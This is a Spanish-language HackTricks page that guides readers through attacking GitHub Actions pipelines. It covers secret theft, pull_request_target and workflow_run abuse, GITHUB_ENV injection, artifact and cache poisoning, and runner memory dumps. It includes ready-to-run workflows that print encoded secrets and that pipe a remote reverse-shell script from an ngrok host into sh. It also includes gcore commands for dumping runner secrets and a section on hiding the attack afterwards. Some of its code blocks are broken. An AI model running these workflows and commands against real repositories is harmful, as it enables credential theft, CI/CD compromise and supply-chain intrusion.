# Abusando de Github Actions

<details>

<summary><strong>Aprende hacking en AWS de cero a h칠roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver a tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF**, consulta los [**PLANES DE SUSCRIPCI칍N**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci칩n de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **칔nete al** 游눫 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s칤gueme** en **Twitter** 游냕 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de github de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Informaci칩n B치sica

En esta p치gina encontrar치s:

* Un **resumen de todos los impactos** de que un atacante logre acceder a una Github Action
* Diferentes formas de **obtener acceso a una acci칩n**:
  * Tener **permisos** para crear la acci칩n
  * Abusar de los disparadores relacionados con **pull request**
  * Abusar de **otras t칠cnicas de acceso externo**
  * **Pivoteo** desde un repositorio ya comprometido
* Finalmente, una secci칩n sobre **t칠cnicas de post-explotaci칩n para abusar de una acci칩n desde dentro** (causar los impactos mencionados)

## Resumen de Impactos

Para una introducci칩n sobre [**Github Actions consulta la informaci칩n b치sica**](../basic-github-information.md#github-actions).

En caso de que puedas **ejecutar Github actions/arbitrarias inyectar c칩digo** en un **repositorio**, podr칤as:

* **Robar** los **secrets** de ese repo/organizaci칩n.
  * Si solo puedes inyectar, puedes robar lo que ya est치 presente en el flujo de trabajo.
* Abusar de los **privilegios del repo** para acceder a otras plataformas como AWS y GCP.
* **Ejecutar c칩digo en workers personalizados** (si se usan) e intentar pivotar desde all칤.
* **Sobrescribir** el **c칩digo** del repositorio.
  * Esto depende de los privilegios del `GITHUB_TOKEN` (si los hay).
* **Comprometer** **despliegues** y otros **artefactos**.
  * Si el c칩digo est치 desplegando o almacenando algo, podr칤as modificarlo y obtener alg칰n acceso adicional.

## GITHUB\_TOKEN

Este "**secret**" (proveniente de `${{ secrets.GITHUB_TOKEN }}` y `${{ github.token }}`) se otorga cuando el administrador habilita esta opci칩n:

<figure><img src="../../../.gitbook/assets/image (92).png" alt=""><figcaption></figcaption></figure>

Este token es el mismo que usar칤a una **Aplicaci칩n de Github**, por lo que puede acceder a los mismos puntos finales: [https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps](https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps)

{% hint style="warning" %}
Github deber칤a lanzar un [**flujo**](https://github.com/github/roadmap/issues/74) que **permita el acceso entre repositorios** dentro de GitHub, para que un repo pueda acceder a otros repos internos usando el `GITHUB_TOKEN`.
{% endhint %}

Puedes ver los posibles **permisos** de este token en: [https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github\_token](https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github\_token)

Ten en cuenta que el token **expira despu칠s de que se haya completado el trabajo**.\
Estos tokens se ven as칤: `ghs_veaxARUji7EXszBMbhkr4Nz2dYz0sqkeiur7`

Algunas cosas interesantes que puedes hacer con este token:

{% tabs %}
{% tab title="Merge PR" %}
```bash
# Merge PR
curl -X PUT \
https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/merge \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
-d '{"commit_title":"commit_title"}'
```
{% endtab %}

{% tab title="Aprobar PR" %}
```bash
# Approve a PR
curl -X POST \
https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/reviews \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
-d '{"event":"APPROVE"}'
```
{% endtab %}

{% tab title="Crear PR" %}
```bash
# Create a PR
curl -X POST \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
https://api.github.com/repos/<org_name>/<repo_name>/pulls \
-d '{"head":"<branch_name>","base":"master", "title":"title"}'
```
```markdown
{% endtab %}
{% endtabs %}

{% hint style="danger" %}
Ten en cuenta que en varias ocasiones podr치s encontrar **tokens de usuario de github dentro de los entornos de Github Actions o en los secretos**. Estos tokens pueden otorgarte m치s privilegios sobre el repositorio y la organizaci칩n.
{% endhint %}

<details>

<summary>Listar secretos en la salida de Github Action</summary>
```
```yaml
name: list_env
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
List_env:
runs-on: ubuntu-latest
steps:
- name: List Env
# Need to base64 encode or github will change the secret value for "***"
run: sh -c 'env | grep "secret_" | base64 -w0'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
<details>

<summary>Obtener shell inversa con secretos</summary>
```yaml
name: revshell
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
create_pull_request:
runs-on: ubuntu-latest
steps:
- name: Get Rev Shell
run: sh -c 'curl https://reverse-shell.sh/2.tcp.ngrok.io:15217 | sh'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

Es posible verificar los permisos otorgados a un Token de Github en repositorios de otros usuarios **revisando los registros** de las acciones:

<figure><img src="../../../.gitbook/assets/image (97).png" alt="" width="269"><figcaption></figcaption></figure>

## Ejecuci칩n Permitida

{% hint style="info" %}
Este ser칤a el modo m치s sencillo de comprometer las acciones de Github, ya que este caso supone que tienes acceso para **crear un nuevo repositorio en la organizaci칩n**, o tienes **privilegios de escritura sobre un repositorio**.

Si te encuentras en este escenario, puedes simplemente revisar las [t칠cnicas de Post Explotaci칩n](./#post-exploitation-techniques-from-inside-an-action).
{% endhint %}

### Ejecuci칩n desde la Creaci칩n de un Repositorio

En caso de que los miembros de una organizaci칩n puedan **crear nuevos repositorios** y t칰 puedas ejecutar acciones de github, puedes **crear un nuevo repositorio y robar los secretos establecidos a nivel de organizaci칩n**.

### Ejecuci칩n desde una Nueva Rama

Si puedes **crear una nueva rama en un repositorio que ya contiene una Acci칩n de Github** configurada, puedes **modificarla**, **subir** el contenido y luego **ejecutar esa acci칩n desde la nueva rama**. De esta manera, puedes **exfiltrar secretos a nivel de repositorio y organizaci칩n** (pero necesitas saber c칩mo se llaman).

Puedes hacer que la acci칩n modificada sea ejecutable **manualmente**, cuando se **crea un PR** o cuando se **sube alg칰n c칩digo** (dependiendo de cu치n notorio quieras ser):
```yaml
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- master
push: # Run it when a push is made to a branch
branches:
- current_branch_name

# Use '**' instead of a branh name to trigger the action in all the cranches
```
***

## Ejecuci칩n bifurcada

{% hint style="info" %}
Existen diferentes desencadenantes que podr칤an permitir a un atacante **ejecutar una Acci칩n de Github de otro repositorio**. Si esas acciones desencadenables est치n mal configuradas, un atacante podr칤a comprometerlas.
{% endhint %}

### `pull_request`

El desencadenante de flujo de trabajo **`pull_request`** ejecutar치 el flujo de trabajo cada vez que se reciba una solicitud de extracci칩n con algunas excepciones: por defecto, si es la **primera vez** que est치s **colaborando**, alg칰n **mantenedor** necesitar치 **aprobar** la **ejecuci칩n** del flujo de trabajo:

<figure><img src="../../../.gitbook/assets/image (4) (2).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
Como la **limitaci칩n predeterminada** es para colaboradores **por primera vez**, podr칤as contribuir **arreglando un error/typo v치lido** y luego enviar **otros PRs para abusar de tus nuevos privilegios de `pull_request`**.

**Prob칠 esto y no funciona**: ~~Otra opci칩n ser칤a crear una cuenta con el nombre de alguien que contribuy칩 al proyecto y elimin칩 su cuenta.~~
{% endhint %}

Adem치s, por defecto **previene permisos de escritura** y **acceso a secretos** al repositorio objetivo como se menciona en los [**documentos**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflows-in-forked-repositories):

> Con la excepci칩n de `GITHUB_TOKEN`, **los secretos no se pasan al ejecutor** cuando un flujo de trabajo se desencadena desde un repositorio **bifurcado**. El **`GITHUB_TOKEN` tiene permisos de solo lectura** en solicitudes de extracci칩n **de repositorios bifurcados**.

Un atacante podr칤a modificar la definici칩n de la Acci칩n de Github para ejecutar cosas arbitrarias y a침adir acciones arbitrarias. Sin embargo, no podr치 robar secretos ni sobrescribir el repositorio debido a las limitaciones mencionadas.

{% hint style="danger" %}
**S칤, si el atacante cambia en el PR la acci칩n de github que se activar치, su Acci칩n de Github ser치 la utilizada y no la del repositorio original.**
{% endhint %}

Como el atacante tambi칠n controla el c칩digo que se ejecuta, incluso si no hay secretos o permisos de escritura en el `GITHUB_TOKEN`, un atacante podr칤a, por ejemplo, **subir artefactos maliciosos**.

### **`pull_request_target`**

El desencadenante de flujo de trabajo **`pull_request_target`** tiene **permiso de escritura** en el repositorio objetivo y **acceso a secretos** (y no pide permiso).

Nota que el desencadenante de flujo de trabajo **`pull_request_target`** **se ejecuta en el contexto base** y no en el proporcionado por el PR (para **no ejecutar c칩digo no confiable**). Para m치s informaci칩n sobre `pull_request_target` [**consulta los documentos**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#pull\_request\_target).\
Adem치s, para m치s informaci칩n sobre este uso peligroso espec칤fico consulta esta [**publicaci칩n de blog de github**](https://securitylab.github.com/research/github-actions-preventing-pwn-requests/).

Puede parecer que debido a que el **flujo de trabajo ejecutado** es el definido en la **base** y **no en el PR** es **seguro** usar **`pull_request_target`**, pero hay **algunos casos en los que no lo es**.

Y este tendr치 **acceso a secretos**.

### `workflow_run`

El desencadenante [**workflow\_run**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflow\_run) permite ejecutar un flujo de trabajo desde otro diferente cuando est치 `completed`, `requested` o `in_progress`.

En este ejemplo, se configura un flujo de trabajo para ejecutarse despu칠s de que el flujo de trabajo "Run Tests" separado se complete:
```yaml
on:
workflow_run:
workflows: [Run Tests]
types:
- completed
```
Adem치s, seg칰n la documentaci칩n: El flujo de trabajo iniciado por el evento `workflow_run` puede **acceder a secretos y escribir tokens, incluso si el flujo de trabajo anterior no pudo**.

Este tipo de flujo de trabajo podr칤a ser atacado si **depende** de un **flujo de trabajo** que puede ser **activado** por un usuario externo a trav칠s de **`pull_request`** o **`pull_request_target`**. Un par de ejemplos vulnerables se pueden [**encontrar en este blog**](https://www.legitsecurity.com/blog/github-privilege-escalation-vulnerability)**.** El primero consiste en el flujo de trabajo activado por **`workflow_run`** descargando el c칩digo del atacante: `${{ github.event.pull_request.head.sha }}`\
El segundo consiste en **pasar** un **artefacto** del c칩digo **no confiable** al flujo de trabajo **`workflow_run`** y usar el contenido de este artefacto de una manera que lo hace **vulnerable a RCE**.

### `workflow_call`

TODO

TODO: Verificar si cuando se ejecuta desde un pull\_request el c칩digo utilizado/descargado es el del origen o del PR bifurcado

## Abusando de la Ejecuci칩n en Bifurcaciones

Hemos mencionado todas las formas en que un atacante externo podr칤a lograr que se ejecute un flujo de trabajo de github, ahora veamos c칩mo estas ejecuciones, si est치n mal configuradas, podr칤an ser abusadas:

### Ejecuci칩n de checkout no confiable

En el caso de **`pull_request`,** el flujo de trabajo se ejecutar치 en el **contexto del PR** (por lo que ejecutar치 el **c칩digo malicioso del PR**), pero alguien necesita **autorizarlo primero** y se ejecutar치 con algunas [limitaciones](./#pull\_request).

En caso de un flujo de trabajo que usa **`pull_request_target` o `workflow_run`** que depende de un flujo de trabajo que puede ser activado desde **`pull_request_target` o `pull_request`**, se ejecutar치 el c칩digo del repositorio original, por lo que el **atacante no puede controlar el c칩digo ejecutado**.

{% hint style="danger" %}
Sin embargo, si la **acci칩n** tiene un **checkout expl칤cito de PR** que **obtendr치 el c칩digo del PR** (y no de la base), usar치 el c칩digo controlado por los atacantes. Por ejemplo (ver l칤nea 12 donde se descarga el c칩digo del PR):
{% endhint %}

<pre class="language-yaml"><code class="lang-yaml"># INSEGURO. Proporcionado solo como ejemplo.
on:
pull_request_target

jobs:
build:
name: Construir y probar
runs-on: ubuntu-latest
steps:
<strong>    - uses: actions/checkout@v2
</strong><strong>      with:
</strong><strong>        ref: ${{ github.event.pull_request.head.sha }}
</strong>
- uses: actions/setup-node@v1
- run: |
npm install
npm build

- uses: completely/fakeaction@v2
with:
arg1: ${{ secrets.supersecret }}

- uses: fakerepo/comment-on-pr@v1
with:
message: |
춰Gracias!
</code></pre>

El c칩digo potencialmente **no confiable se est치 ejecutando durante `npm install` o `npm build`** ya que los scripts de construcci칩n y los **paquetes referenciados est치n controlados por el autor del PR**.

{% hint style="warning" %}
Un dork de github para buscar acciones vulnerables es: `event.pull_request pull_request_target extension:yml` sin embargo, hay diferentes formas de configurar los trabajos para que se ejecuten de manera segura incluso si la acci칩n est치 configurada de manera insegura (como usar condicionales sobre qui칠n es el actor que genera el PR).
{% endhint %}

### Inyecciones de Script en Contexto <a href="#understanding-the-risk-of-script-injections" id="understanding-the-risk-of-script-injections"></a>

Tenga en cuenta que hay ciertos [**contextos de github**](https://docs.github.com/en/actions/reference/context-and-expression-syntax-for-github-actions#github-context) cuyos valores son **controlados** por el **usuario** que crea el PR. Si la acci칩n de github est치 usando esos **datos para ejecutar algo**, podr칤a llevar a **ejecuci칩n de c칩digo arbitrario:**

{% content-ref url="gh-actions-context-script-injections.md" %}
[gh-actions-context-script-injections.md](gh-actions-context-script-injections.md)
{% endcontent-ref %}

### **Inyecci칩n de Script en GITHUB\_ENV** <a href="#what-is-usdgithub_env" id="what-is-usdgithub_env"></a>

Seg칰n la documentaci칩n: Puedes hacer que una **variable de entorno est칠 disponible para cualquier paso subsiguiente** en un trabajo de flujo de trabajo definiendo o actualizando la variable de entorno y escribiendo esto en el archivo de entorno **`GITHUB_ENV`**.

Si un atacante pudiera **inyectar cualquier valor** dentro de esta variable **env**, podr칤a inyectar variables de entorno que podr칤an ejecutar c칩digo en pasos siguientes como **LD\_PRELOAD** o **NODE\_OPTIONS**.

Por ejemplo ([**esto**](https://www.legitsecurity.com/blog/github-privilege-escalation-vulnerability-0) y [**esto**](https://www.legitsecurity.com/blog/-how-we-found-another-github-action-environment-injection-vulnerability-in-a-google-project)), imagina un flujo de trabajo que conf칤a en un artefacto subido para almacenar su contenido dentro de la variable de entorno **`GITHUB_ENV`**. Un atacante podr칤a subir algo como esto para comprometerlo:

<figure><img src="../../../.gitbook/assets/image (3) (2).png" alt=""><figcaption></figcaption></figure>

### Acciones de Github de Terceros Vulnerables

#### [dawidd6/action-download-artifact](https://github.com/dawidd6/action-download-artifact)

Como se menciona en [**este post de blog**](https://www.legitsecurity.com/blog/github-actions-that-open-the-door-to-cicd-pipeline-attacks), esta Acci칩n de Github permite acceder a artefactos de diferentes flujos de trabajo e incluso repositorios.

El problema es que si el par치metro **`path`** no est치 establecido, el artefacto se extrae en el directorio actual y puede sobrescribir archivos que podr칤an ser usados o incluso ejecutados m치s tarde en el flujo de trabajo. Por lo tanto, si el Artefacto es vulnerable, un atacante podr칤a abusar de esto para comprometer otros flujos de trabajo que conf칤an en el Artefacto.

Ejemplo de flujo de trabajo vulnerable:
```yaml
on:
workflow_run:
workflows: ["some workflow"]
types:
- completed

jobs:
success:
runs-on: ubuntu-latest
steps:
- uses: actions/checkout@v2
- name: download artifact
uses: dawidd6/action-download-artifact
with:
workflow: ${{ github.event.workflow_run.workflow_id }}
name: artifact
- run: python ./script.py
with:
name: artifact
path: ./script.py
```
Esto podr칤a ser atacado con este flujo de trabajo:
```yaml
name: "some workflow"
on: pull_request

jobs:
upload:
runs-on: ubuntu-latest
steps:
- run: echo "print('exploited')" > ./script.py
- uses actions/upload-artifact@v2
with:
name: artifact
path: ./script.py
```
***

## Otro Acceso Externo

### Secuestro de Repositorio de Namespace Eliminado

Si una cuenta cambia su nombre, otro usuario podr칤a registrar una cuenta con ese nombre despu칠s de alg칰n tiempo. Si un repositorio ten칤a **menos de 100 estrellas antes del cambio de nombre**, Github permitir치 al nuevo usuario registrado con el mismo nombre crear un **repositorio con el mismo nombre** que el eliminado.

{% hint style="danger" %}
Entonces, si una acci칩n est치 utilizando un repositorio de una cuenta inexistente, a칰n es posible que un atacante cree esa cuenta y comprometa la acci칩n.
{% endhint %}

Si otros repositorios estaban utilizando **dependencias de los repositorios de este usuario**, un atacante podr치 secuestrarlos. Aqu칤 tienes una explicaci칩n m치s completa: [https://blog.nietaanraken.nl/posts/gitub-popular-repository-namespace-retirement-bypass/](https://blog.nietaanraken.nl/posts/gitub-popular-repository-namespace-retirement-bypass/)

***

## Pivoteo de Repositorio

{% hint style="info" %}
En esta secci칩n hablaremos sobre t칠cnicas que permitir칤an **pivoteo de un repositorio a otro** suponiendo que tenemos alg칰n tipo de acceso en el primero (revisa la secci칩n anterior).
{% endhint %}

### Envenenamiento de Cach칠

Se mantiene una cach칠 entre **ejecuciones de wokflow en la misma rama**. Lo que significa que si un atacante **compromete** un **paquete** que luego se almacena en la cach칠 y es **descargado** y ejecutado por un workflow **m치s privilegiado**, tambi칠n podr치 **comprometer** ese workflow.

{% content-ref url="gh-actions-cache-poisoning.md" %}
[gh-actions-cache-poisoning.md](gh-actions-cache-poisoning.md)
{% endcontent-ref %}

### Envenenamiento de Artefactos

Los workflows podr칤an usar **artefactos de otros workflows e incluso repositorios**, si un atacante logra **comprometer** la Github Action que **sube un artefacto** que luego es utilizado por otro workflow, podr칤a **comprometer los otros workflows**:

{% content-ref url="gh-actions-artifact-poisoning.md" %}
[gh-actions-artifact-poisoning.md](gh-actions-artifact-poisoning.md)
{% endcontent-ref %}

***

## Post Explotaci칩n desde una Acci칩n

### Accediendo a AWS y GCP v칤a OIDC

Consulta las siguientes p치ginas:

{% content-ref url="../../../pentesting-cloud/aws-security/aws-basic-information/aws-federation-abuse.md" %}
[aws-federation-abuse.md](../../../pentesting-cloud/aws-security/aws-basic-information/aws-federation-abuse.md)
{% endcontent-ref %}

{% content-ref url="../../../pentesting-cloud/gcp-security/gcp-basic-information/gcp-federation-abuse.md" %}
[gcp-federation-abuse.md](../../../pentesting-cloud/gcp-security/gcp-basic-information/gcp-federation-abuse.md)
{% endcontent-ref %}

### Accediendo a secretos <a href="#accessing-secrets" id="accessing-secrets"></a>

Si est치s inyectando contenido en un script, es interesante saber c칩mo puedes acceder a los secretos:

* Si el secreto o token se establece en una **variable de entorno**, se puede acceder directamente a trav칠s del entorno utilizando **`printenv`**.

<details>

<summary>Listar secretos en la salida de Github Action</summary>
```yaml
name: list_env
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
List_env:
runs-on: ubuntu-latest
steps:
- name: List Env
# Need to base64 encode or github will change the secret value for "***"
run: sh -c 'env | grep "secret_" | base64 -w0'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}

secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
<details>

<summary>Obtener shell inversa con secretos</summary>
```yaml
name: revshell
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
create_pull_request:
runs-on: ubuntu-latest
steps:
- name: Get Rev Shell
run: sh -c 'curl https://reverse-shell.sh/2.tcp.ngrok.io:15217 | sh'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
<details>

* Si el secreto se utiliza **directamente en una expresi칩n**, el script de shell generado se almacena **en disco** y es accesible.
* ```bash
cat /home/runner/work/_temp/*
```
* Para acciones de JavaScript, los secretos se env칤an a trav칠s de variables de entorno
* ```bash
ps axe | grep node
```
*   Para una **acci칩n personalizada**, el riesgo puede variar dependiendo de c칩mo un programa est칠 utilizando el secreto que obtuvo del **argumento**:

```yaml
uses: fakeaction/publish@v3
with:
key: ${{ secrets.PUBLISH_KEY }}
```

### Abusando de ejecutores autoalojados

La manera de encontrar qu칠 **Github Actions se est치n ejecutando en infraestructura no-Github** es buscar **`runs-on: self-hosted`** en el yaml de configuraci칩n de Github Actions.

Los ejecutores **autoalojados** podr칤an tener acceso a **informaci칩n extremadamente sensible**, a otros **sistemas de red** (쯣untos finales vulnerables en la red? 쯥ervicio de metadatos?) o, incluso si est치 aislado y destruido, **podr칤a ejecutarse m치s de una acci칩n al mismo tiempo** y la maliciosa podr칤a **robar los secretos** de la otra.

En los ejecutores autoalojados tambi칠n es posible obtener los **secretos del proceso **_**Runner.Listener**_** que contendr치 todos los secretos de los flujos de trabajo en cualquier paso al volcar su memoria:

{% code overflow="wrap" %}
```bash
sudo apt-get install -y gdb
sudo gcore -o k.dump "$(ps ax | grep 'Runner.Listener' | head -n 1 | awk '{ print $1 }')"
```
{% endcode %}

Consulte [**este post para m치s informaci칩n**](https://karimrahal.com/2023/01/05/github-actions-leaking-secrets/).

### Registro de Im치genes Docker de Github

Es posible crear acciones de Github que **construyan y almacenen una imagen Docker dentro de Github**.\
Un ejemplo se puede encontrar en el siguiente desplegable:

<details>

<summary>Acci칩n de Github para Construir y Empujar Imagen Docker</summary>
```yaml
[...]

- name: Set up Docker Buildx
uses: docker/setup-buildx-action@v1

- name: Login to GitHub Container Registry
uses: docker/login-action@v1
with:
registry: ghcr.io
username: ${{ github.repository_owner }}
password: ${{ secrets.ACTIONS_TOKEN }}

- name: Add Github Token to Dockerfile to be able to download code
run: |
sed -i -e 's/TOKEN=##VALUE##/TOKEN=${{ secrets.ACTIONS_TOKEN }}/g' Dockerfile

- name: Build and push
uses: docker/build-push-action@v2
with:
context: .
push: true
tags: |
ghcr.io/${{ github.repository_owner }}/${{ github.event.repository.name }}:latest
ghcr.io/${{ github.repository_owner }}/${{ github.event.repository.name }}:${{ env.GITHUB_NEWXREF }}-${{ github.sha }}

[...]
```
</details>

Como pudiste ver en el c칩digo anterior, el registro de Github est치 alojado en **`ghcr.io`**.

Un usuario con permisos de lectura sobre el repositorio podr치 entonces descargar la Imagen Docker utilizando un token de acceso personal:
```bash
echo $gh_token | docker login ghcr.io -u <username> --password-stdin
docker pull ghcr.io/<org-name>/<repo_name>:<tag>
```
Entonces, el usuario podr칤a buscar **secretos filtrados en las capas de la imagen Docker:**

{% embed url="https://book.hacktricks.xyz/generic-methodologies-and-resources/basic-forensic-methodology/docker-forensics" %}

### Informaci칩n sensible en los registros de Github Actions

Aunque **Github** intenta **detectar valores secretos** en los registros de las acciones y **evitar mostrarlos**, **otros datos sensibles** que podr칤an haberse generado en la ejecuci칩n de la acci칩n no estar치n ocultos. Por ejemplo, un JWT firmado con un valor secreto no estar치 oculto a menos que est칠 [configurado espec칤ficamente](https://github.com/actions/toolkit/tree/main/packages/core#setting-a-secret).

## Cubriendo tus Huellas

(T칠cnica de [**aqu칤**](https://divyanshu-mehta.gitbook.io/researchs/hijacking-cloud-ci-cd-systems-for-fun-and-profit)) Primero que todo, cualquier PR creado es claramente visible al p칰blico en Github y a la cuenta de GitHub objetivo. En GitHub por defecto, **no podemos eliminar un PR de internet**, pero hay un giro. Para cuentas de Github que son **suspendidas** por Github, todos sus **PRs son autom치ticamente eliminados** y removidos de internet. As칤 que para ocultar tu actividad necesitas que tu **cuenta de GitHub sea suspendida o que tu cuenta sea marcada**. Esto **ocultar치 todas tus actividades** en GitHub de internet (b치sicamente eliminar치 todos tus PR de explotaci칩n)

Una organizaci칩n en GitHub es muy proactiva reportando cuentas a GitHub. Todo lo que necesitas hacer es compartir "algo" en Issue y ellos se asegurar치n de que tu cuenta sea suspendida en 12 horas :p y ah칤 lo tienes, has hecho tu explotaci칩n invisible en github.

{% hint style="warning" %}
La 칰nica manera de que una organizaci칩n se d칠 cuenta de que ha sido objetivo es revisar los registros de GitHub desde SIEM ya que desde la interfaz de usuario de GitHub el PR ser칤a eliminado.
{% endhint %}

<details>

<summary><strong>Aprende hacking en AWS de cero a h칠roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras maneras de apoyar a HackTricks:

* Si quieres ver a tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** revisa los [**PLANES DE SUSCRIPCI칍N**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci칩n de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **칔nete al** 游눫 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s칤gueme** en **Twitter** 游냕 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de GitHub de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
